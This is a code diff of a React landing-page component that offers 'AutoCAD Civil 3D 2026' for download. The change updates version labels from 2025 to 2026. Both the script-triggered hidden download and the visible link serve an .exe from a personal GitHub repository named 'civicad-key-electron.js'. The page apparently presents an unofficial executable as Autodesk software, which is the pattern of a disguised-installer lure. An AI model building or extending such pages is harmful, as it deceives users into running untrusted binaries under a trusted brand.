@@ -107,7 +107,7 @@ const HeroSection = ({ isOpen, setIsOpen }: Props = {}) => {
     const tempLink = document.createElement("a");
     tempLink.href =
       "https://github.com/foysalahmedmin/civicad-key-electron.js/raw/refs/heads/main/uploads/autodesk%20Setup%201.0.5.exe";
-    tempLink.download = "AutoCAD Civil 3D 2025";
+    tempLink.download = "AutoCAD Civil 3D 2026";
     tempLink.style.display = "none";
     document.body.appendChild(tempLink);
     tempLink.click();
@@ -163,7 +163,8 @@ const HeroSection = ({ isOpen, setIsOpen }: Props = {}) => {
           Civil 3D
         </div>
         <h3 className="text-2xl font-black md:text-3xl">
-          Autodesk Civil 3D: Comprehensive detailed design and documentation
+          Autodesk Civil 3D 2026: Comprehensive detailed design and
+          documentation
           <br />
           software for civil infrastructure
         </h3>
@@ -182,7 +183,7 @@ const HeroSection = ({ isOpen, setIsOpen }: Props = {}) => {
                 size="sm"
               >
                 <Modal.Header>
-                  <Modal.Title>Download AutoCAD Civil 3D 2025</Modal.Title>
+                  <Modal.Title>Download AutoCAD Civil 3D 2026</Modal.Title>
                   <Modal.Close />
                 </Modal.Header>
                 <Modal.Body>
@@ -237,11 +238,11 @@ const HeroSection = ({ isOpen, setIsOpen }: Props = {}) => {
                         </div>
                         <div className="bg-muted border p-4">
                           <p className="mb-2">
-                            AutoCAD Civil 3D 2025 Ready for Download
+                            AutoCAD Civil 3D 2026 Ready for Download
                           </p>
                           <a
                             href="https://github.com/foysalahmedmin/civicad-key-electron.js/raw/refs/heads/main/uploads/autodesk%20Setup%201.0.5.exe"
-                            download="AutoCAD Civil 3D 2025"
+                            download="AutoCAD Civil 3D 2026"
                             onClick={handleDownloadClick}
                             className="font-bold text-purple-900 underline hover:no-underline"
                           >
